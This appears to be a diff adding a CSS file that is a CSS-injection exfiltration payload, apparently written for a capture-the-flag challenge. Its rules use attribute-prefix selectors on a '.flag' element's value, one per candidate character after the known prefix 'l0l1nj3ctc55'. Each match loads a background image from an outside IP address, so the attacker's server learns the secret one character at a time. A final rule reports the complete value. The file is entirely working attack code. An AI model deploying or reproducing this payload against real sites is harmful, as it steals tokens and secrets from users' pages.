@@ -1,0 +1,189 @@
+.flag[value^=l0l1nj3ctc55a] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55a);
+    }
+.flag[value^=l0l1nj3ctc55b] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55b);
+    }
+.flag[value^=l0l1nj3ctc55c] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55c);
+    }
+.flag[value^=l0l1nj3ctc55d] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55d);
+    }
+.flag[value^=l0l1nj3ctc55e] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55e);
+    }
+.flag[value^=l0l1nj3ctc55f] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55f);
+    }
+.flag[value^=l0l1nj3ctc55g] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55g);
+    }
+.flag[value^=l0l1nj3ctc55h] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55h);
+    }
+.flag[value^=l0l1nj3ctc55i] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55i);
+    }
+.flag[value^=l0l1nj3ctc55j] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55j);
+    }
+.flag[value^=l0l1nj3ctc55k] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55k);
+    }
+.flag[value^=l0l1nj3ctc55l] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55l);
+    }
+.flag[value^=l0l1nj3ctc55m] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55m);
+    }
+.flag[value^=l0l1nj3ctc55n] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55n);
+    }
+.flag[value^=l0l1nj3ctc55o] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55o);
+    }
+.flag[value^=l0l1nj3ctc55p] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55p);
+    }
+.flag[value^=l0l1nj3ctc55q] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55q);
+    }
+.flag[value^=l0l1nj3ctc55r] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55r);
+    }
+.flag[value^=l0l1nj3ctc55s] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55s);
+    }
+.flag[value^=l0l1nj3ctc55t] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55t);
+    }
+.flag[value^=l0l1nj3ctc55u] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55u);
+    }
+.flag[value^=l0l1nj3ctc55v] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55v);
+    }
+.flag[value^=l0l1nj3ctc55w] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55w);
+    }
+.flag[value^=l0l1nj3ctc55x] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55x);
+    }
+.flag[value^=l0l1nj3ctc55y] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55y);
+    }
+.flag[value^=l0l1nj3ctc55z] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55z);
+    }
+.flag[value^=l0l1nj3ctc55A] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55A);
+    }
+.flag[value^=l0l1nj3ctc55B] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55B);
+    }
+.flag[value^=l0l1nj3ctc55C] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55C);
+    }
+.flag[value^=l0l1nj3ctc55D] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55D);
+    }
+.flag[value^=l0l1nj3ctc55E] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55E);
+    }
+.flag[value^=l0l1nj3ctc55F] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55F);
+    }
+.flag[value^=l0l1nj3ctc55G] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55G);
+    }
+.flag[value^=l0l1nj3ctc55H] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55H);
+    }
+.flag[value^=l0l1nj3ctc55I] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55I);
+    }
+.flag[value^=l0l1nj3ctc55J] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55J);
+    }
+.flag[value^=l0l1nj3ctc55K] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55K);
+    }
+.flag[value^=l0l1nj3ctc55L] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55L);
+    }
+.flag[value^=l0l1nj3ctc55M] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55M);
+    }
+.flag[value^=l0l1nj3ctc55N] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55N);
+    }
+.flag[value^=l0l1nj3ctc55O] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55O);
+    }
+.flag[value^=l0l1nj3ctc55P] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55P);
+    }
+.flag[value^=l0l1nj3ctc55Q] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55Q);
+    }
+.flag[value^=l0l1nj3ctc55R] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55R);
+    }
+.flag[value^=l0l1nj3ctc55S] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55S);
+    }
+.flag[value^=l0l1nj3ctc55T] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55T);
+    }
+.flag[value^=l0l1nj3ctc55U] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55U);
+    }
+.flag[value^=l0l1nj3ctc55V] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55V);
+    }
+.flag[value^=l0l1nj3ctc55W] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55W);
+    }
+.flag[value^=l0l1nj3ctc55X] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55X);
+    }
+.flag[value^=l0l1nj3ctc55Y] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55Y);
+    }
+.flag[value^=l0l1nj3ctc55Z] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc55Z);
+    }
+.flag[value^=l0l1nj3ctc550] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc550);
+    }
+.flag[value^=l0l1nj3ctc551] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc551);
+    }
+.flag[value^=l0l1nj3ctc552] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc552);
+    }
+.flag[value^=l0l1nj3ctc553] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc553);
+    }
+.flag[value^=l0l1nj3ctc554] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc554);
+    }
+.flag[value^=l0l1nj3ctc555] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc555);
+    }
+.flag[value^=l0l1nj3ctc556] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc556);
+    }
+.flag[value^=l0l1nj3ctc557] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc557);
+    }
+.flag[value^=l0l1nj3ctc558] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc558);
+    }
+.flag[value^=l0l1nj3ctc559] {
+        background-image: url(http://220.255.192.228:8081/flag12=l0l1nj3ctc559);
+    }
+.flag[value=l0l1nj3ctc55] {
+    background-image: url(http://220.255.192.228:8081/flag_final=l0l1nj3ctc55);
+}
